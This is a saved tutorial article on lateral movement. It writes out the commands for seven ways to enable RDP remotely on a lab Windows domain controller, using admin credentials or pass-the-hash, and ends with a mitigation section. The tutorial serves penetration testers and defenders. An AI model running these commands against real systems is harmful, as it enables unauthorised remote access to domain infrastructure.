---
title: "Lateral Movement: Enabling RDP Remotely"
author: "raj"
date: "2026-04-16"
source: "https://www.hackingarticles.in/lateral-movement-enabling-rdp-remotely/"
domain: "www.hackingarticles.in"
saved: "2026-05-09 22:31"
---

# Lateral Movement: Enabling RDP Remotely

**By:** raj | **Date:** 2026-04-16 | **Source:** [www.hackingarticles.in](https://www.hackingarticles.in/lateral-movement-enabling-rdp-remotely/)

## 📑 Table of Contents

- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Phase 1: Reconnaissance — Confirming RDP is Disabled](#phase-1-reconnaissance--confirming-rdp-is-disabled)
- [Nmap Port Scan](#nmap-port-scan)
- [Phase 2: Unlocking RDP — 6 Exploitation Techniques](#phase-2-unlocking-rdp-6-exploitation-techniques)
- [Technique 1 — NetExec (nxc) RDP Module via WMI](#technique-1--netexec-nxc-rdp-module-via-wmi)
- [Verification — Port 3389 Now Open](#verification--port-3389-now-open)
- [Technique 2 — NetExec with Pass-the-Hash via wmiexec](#technique-2--netexec-with-pass-the-hash-via-wmiexec)
- [Technique 3 — Impacket-reg](#technique-3--impacket-reg)
- [Technique 4 — Impacket-psexec with Registry Command](#technique-4--impacket-psexec-with-registry-command)
- [Technique 5 — Evil-WinRM with PowerShell](#technique-5--evil-winrm-with-powershell)
- [Technique 6 — Samba net rpc Registry](#technique-6--samba-net-rpc-registry)
- [Technique 7 — Metasploit post/windows/manage/enable_rdp](#technique-7--metasploit-postwindowsmanageenablerdp)
- [Phase 3: Connecting via RDP — Three Client Options](#phase-3-connecting-via-rdp--three-client-options)
- [RDP Client 1 — rdesktop (Basic Connection)](#rdp-client-1--rdesktop-basic-connection)
- [RDP Client 2 — xfreerdp3 with Pass-the-Hash](#rdp-client-2--xfreerdp3-with-pass-the-hash)
- [RDP Client 3 — Remmina (GUI Client)](#rdp-client-3--remmina-gui-client)
- [Mitigation Strategies](#mitigation-strategies)
- [Conclusion](#conclusion)

---

## 📖 Overview

> This article presents a hands-on walkthrough demonstrating multiple real-world techniques to remotely enable RDP on a Windows Server 2019 Domain Controller (DC.ignite.local, 192.168.1.11) and subsequently connect to it using various RDP clients available on Kali Linux. Each technique leverages different tools and access vectors, illustrating the depth of an attacker’s arsenal.

---

This article presents a hands-on walkthrough demonstrating multiple real-world techniques to remotely enable RDP on a Windows Server 2019 Domain Controller (DC.ignite.local, 192.168.1.11) and subsequently connect to it using various RDP clients available on Kali Linux. Each technique leverages different tools and access vectors, illustrating the depth of an attacker’s arsenal.

#### Table of Contents

- Introduction
- Phase 1: Reconnaissance — Confirming RDP is Disabled

Nmap Port Scan
- Phase 2: Unlocking RDP — 6 Exploitation Techniques

Technique 1 — NetExec (nxc) RDP Module via WMI
Technique 2 — NetExec with Pass-the-Hash via wmiexec
Technique 3 — Impacket-reg
Technique 4 — Impacket-psexec with Registry Command
Technique 5 — Evil-WinRM with PowerShell
Technique 6 — Samba net rpc Registry
Technique 7 — Metasploit post/windows/manage/enable_rdp
- Phase 3: Connecting via RDP — Three Client Options

RDP Client 1 — rdesktop (Basic Connection)
RDP Client 2 — xfreerdp3 with Pass-the-Hash
RDP Client 3 — Remmina (GUI Client)
- Technique Comparison
- Mitigation Strategies
- Conclusion

#### Introduction

Remote Desktop Protocol (RDP) is a powerful Windows service that enables graphical remote access to a machine over a network. During red team engagements and penetration tests, attackers who gain initial access to credentials or hashes frequently need to escalate their operational footprint by enabling and connecting via RDP — even when the service is initially disabled on the target.

### Phase 1: Reconnaissance — Confirming RDP is Disabled

#### Nmap Port Scan

The engagement begins with a targeted Nmap scan to determine the current state of port 3389 (the default RDP port) on the domain controller.

EnlighterJS 3 Syntax Highlighter

This confirms that Remote Desktop Services are disabled on the target Domain Controller. We will now proceed to enable RDP using several different remote techniques.

### Phase 2: Unlocking RDP — 6 Exploitation Techniques

#### Technique 1 — NetExec (nxc) RDP Module via WMI

The attacker uses NetExec, a modern network credential validation and exploitation framework, to enable RDP on the target using a dedicated module over SMB with valid credentials.

EnlighterJS 3 Syntax Highlighter

nxc smb 192.168.1.11 -u administrator -p Ignite@987 -M rdp -o ACTION=enable

nxc smb 192.168.1.11 -u administrator -p Ignite@987 -M rdp -o ACTION=enable

NetExec authenticates as the domain administrator against SMB (port 445) on the DC, then leverages the built-in RDP module with ACTION=enable. NetExec then enables RDP via WMI (ncacn_ip_tcp) and confirms the RDP port is now set to 3389.

#### Verification — Port 3389 Now Open

A follow-up Nmap scan confirms that port 3389/tcp is now open on DC.ignite.local. The ms-wbt-server service is actively listening, validating that Technique 1 successfully activated Remote Desktop Services on the target.

#### Technique 2 — NetExec with Pass-the-Hash via wmiexec

In scenarios where the plaintext password is unavailable but the NTLM hash is known, the attacker leverages Pass-the-Hash (PtH) authentication using NetExec’s -x flag to execute a registry command remotely via wmiexec with the help of following command:

EnlighterJS 3 Syntax Highlighter

nxc smb 192.168.1.11 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'

nxc smb 192.168.1.11 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'

NetExec authenticates successfully (Null Auth: True, SMBv1: None) and executes the registry command via wmiexec. The registry key fDenyTSConnections under the Terminal Server path sets to 0, which directly enables Remote Desktop. The operation completes successfully.

#### Technique 3 — Impacket-reg

Impacket’s reg utility allows an attacker to directly interact with the Windows registry of a remote target over SMB, providing a clean and reliable method to modify registry keys. So, to modify the the said keys we will use the following command:

EnlighterJS 3 Syntax Highlighter

impacket-reg ignite.local/administrator:Ignite@987@192.168.1.11 add -keyName "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" -v fDenyTSConnections -vt REG_DWORD -vd 0

impacket-reg ignite.local/administrator:Ignite@987@192.168.1.11 add -keyName "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" -v fDenyTSConnections -vt REG_DWORD -vd 0

Impacket-reg authenticates as administrator and directly writes a DWORD value of 0 to the fDenyTSConnections key in the registry. The tool confirms the operation by displaying the key path, value type (REG_DWORD), and the new data (0). This technique requires no interactive shell and works entirely over the SMB protocol.

#### Technique 4 — Impacket-psexec with Registry Command

Impacket’s psexec module uploads a service binary to the target, creates and starts a Windows service, and delivers a fully interactive SYSTEM-level shell — from which the attacker directly executes the following registry command:

EnlighterJS 3 Syntax Highlighter

impacket-psexec ignite.local/administrator:Ignite@987@192.168.1.11

impacket-psexec ignite.local/administrator:Ignite@987@192.168.1.11

EnlighterJS 3 Syntax Highlighter

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

This technique is extremely powerful because it operates as NT AUTHORITY\SYSTEM, bypassing all user-level restrictions.

#### Technique 5 — Evil-WinRM with PowerShell

Evil-WinRM is a Ruby-based offensive WinRM shell designed for penetration testing. It connects via Windows Remote Management (WinRM) on port 5985 and provides a full PowerShell session on the target with the help of the following command:

EnlighterJS 3 Syntax Highlighter

evil-winrm -i 192.168.1.11 -u administrator -p Ignite@987

evil-winrm -i 192.168.1.11 -u administrator -p Ignite@987

EnlighterJS 3 Syntax Highlighter

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0

The PowerShell cmdlet silently applies the change. Evil-WinRM provides a persistent, interactive shell that supports file transfer, script loading, and bypass capabilities, making it a favored post-exploitation tool in Active Directory environments.

#### Technique 6 — Samba net rpc Registry

The native Samba net utility, available on Kali Linux, provides RPC-based registry manipulation without requiring any third-party tools beyond the standard Samba suite. We will use this utility as desired with the help of following command:

EnlighterJS 3 Syntax Highlighter

net rpc registry setvalue 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' 'fDenyTSConnections' dword '0' -U ignite.local/administrator%'Ignite@987' -S 192.168.1.11

net rpc registry setvalue 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' 'fDenyTSConnections' dword '0' -U ignite.local/administrator%'Ignite@987' -S 192.168.1.11

This single command authenticates via RPC using domain credentials and directly sets the fDenyTSConnections DWORD value to 0. It leverages the Samba toolchain’s RPC registry interface — a stealthy and lightweight approach that does not upload binaries or create services, leaving a minimal footprint on the target system.

#### Technique 7 — Metasploit post/windows/manage/enable_rdp

Metasploit Framework’s post-exploitation module provides an automated, menu-driven approach to enabling RDP from within an active Meterpreter session. And the said module is:

EnlighterJS 3 Syntax Highlighter

use post/windows/manage/enable_rdp

use post/windows/manage/enable_rdp
set session 1
exploit

The module detects that RDP is disabled and activates it automatically. It configures Terminal Services to auto-start, opens port 3389 in the local firewall, and logs a cleanup resource file for post-engagement restoration. This technique is ideal for operators working inside a Metasploit workflow who already hold a Meterpreter session on the target.

### Phase 3: Connecting via RDP — Three Client Options

With RDP successfully enabled through any of the above techniques, the attacker now connects to the Domain Controller’s desktop. Kali Linux supports several RDP clients, each with distinct capabilities.

#### RDP Client 1 — rdesktop (Basic Connection)

We will use the following command to connect to the remote desktop:

EnlighterJS 3 Syntax Highlighter

rdesktop is a lightweight, open-source RDP client available on most Linux systems. The connection succeeds with a certificate warning regarding NLA (Network Level Authentication) — rdesktop bypasses this and renders the full Windows Server 2019 Standard Evaluation desktop.

#### RDP Client 2 — xfreerdp3 with Pass-the-Hash

xfreerdp3 is the most feature-rich RDP client on Kali Linux, supporting advanced options such as Pass-the-Hash (/pth), clipboard sharing, drive redirection, and compression. Therefore, with the help of following command we will connect to remote desktop:

EnlighterJS 3 Syntax Highlighter

xfreerdp3 /compression +auto-reconnect /u:administrator /pth:32196B56FFE6F45E294117B91A83BF38 /v:192.168.1.11 +clipboard

xfreerdp3 /compression +auto-reconnect /u:administrator /pth:32196B56FFE6F45E294117B91A83BF38 /v:192.168.1.11 +clipboard

Using the NTLM hash directly eliminates the need for a plaintext password. The connection succeeds and opens the Windows Server Manager dashboard, confirming Domain Controller access with AD CS and AD DS roles visible. This technique is particularly powerful because it works even when the plaintext password is unknown.

#### RDP Client 3 — Remmina (GUI Client)

Remmina is a full-featured graphical remote desktop client that supports RDP, VNC, SSH, and other protocols through a polished GUI interface. After launching Remmina and configuring the target IP (192.168.1.11) with domain credentials, the client establishes a clean RDP session to the DC, displaying the Windows Server Manager dashboard. Remmina is ideal for operators who require a stable, user-friendly GUI for prolonged access or when performing detailed administrative tasks on the target.

#### Mitigation Strategies

The seven RDP enablement techniques exploit credential theft, weak protocols (SMB/WMI/WinRM/RPC), and poor network controls. Implement these targeted countermeasures for defense-in-depth:

- Credential Hardening: Deploy LAPS/Windows LAPS to rotate local admin passwords across domain-joined systems, invalidating stolen hashes from one host on others (neutralizes Techniques 1-6). Enforce 15+ character complex passwords, least privilege, and PAWs/tiered admin to limit credential exposure.
- NTLM Blocking: Restrict NTLM via GPO (block v1, audit v2), enable Credential Guard for hash isolation in VBS, and add admins to Protected Users group to prevent pass-the-hash (blocks Technique 2, Phase 3 PtH RDP).
- SMB Restrictions: Block TCP/UDP 445 at firewalls/perimeter; disable SMBv1; enforce SMB signing on DCs/servers; hide ADMIN$/IPC$ shares via GPO (stops NetExec, impacket-reg/psexec in Techniques 1-4).
- WMI Controls: Firewall DCOM (135 + high ports); tighten WMI namespace ACLs (wmimgmt.msc); use WDAC/AppLocker to block WMI script execution; monitor EID 4688 for remote cmd/PowerShell spawns (blocks Techniques 1-2).
- WinRM Disablement: Run Disable-PSRemoting -Force; block 5985/5986; enable full PowerShell logging (Script/Module/Transcription) and Constrained Language Mode (neutralizes Technique 5 Evil-WinRM).
- RPC Registry Lockdown: Disable RemoteRegistry service via GPO; restrict HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\Winreg ACLs; monitor EID 5039 (blocks Technique 6 Samba net rpc).
- RDP Network Limits: GPO-firewall TCP 3389 to approved gateways only; deploy RD Gateway with MFA; enforce NLA; restrict “Allow logon through RDP” to Remote Desktop Users group (renders Phase 3 RDP ineffective).
- Service/Payload Prevention: Deploy EDR for Meterpreter detection; alert EID 7045/4697 on new services from ADMIN$/TEMP; use WDAC to block unsigned psexec binaries (stops Technique 7, Technique 4).
- Zero-Trust Segmentation: Isolate DCs in VLANs; block workstation-to-DC management ports; apply ZTNA/micro-segmentation for per-flow auth (breaks flat-network pivots).
- Detection Rules: SIEM-forward Security/System/PowerShell/WMI logs; alert on EID 4657 (fDenyTSConnections change), 4624/4648 (SMB/RDP logons), 4698/7045 (tasks/services); hunt with this chain.

#### Conclusion

This article demonstrates that an attacker who possesses valid credentials or password hashes can, in fact, enable RDP on a Windows Server Domain Controller through at least seven distinct techniques. These include NetExec modules, Impacket utilities, Evil-WinRM PowerShell, native Samba RPC, and Metasploit post-exploitation modules.

Once RDP is active, three different Kali Linux clients — rdesktop, xfreerdp3, and Remmina — successfully deliver interactive graphical sessions, including via Pass-the-Hash without ever using a plaintext password. Organizations must harden their environments by enforcing network segmentation, credential rotation, LAPS deployment, and RDP gateway policies to detect and prevent such access.

Ultimately, for red teams and penetration testers, this workflow clearly highlights the importance of mastering multiple tools and techniques; in particular, it ensures operational continuity even when a single approach fails or, alternatively, raises alerts.


---

## 📌 Source
- URL: https://www.hackingarticles.in/lateral-movement-enabling-rdp-remotely/
- Saved: 2026-05-09 22:31
- Auto-generated by Web Clipper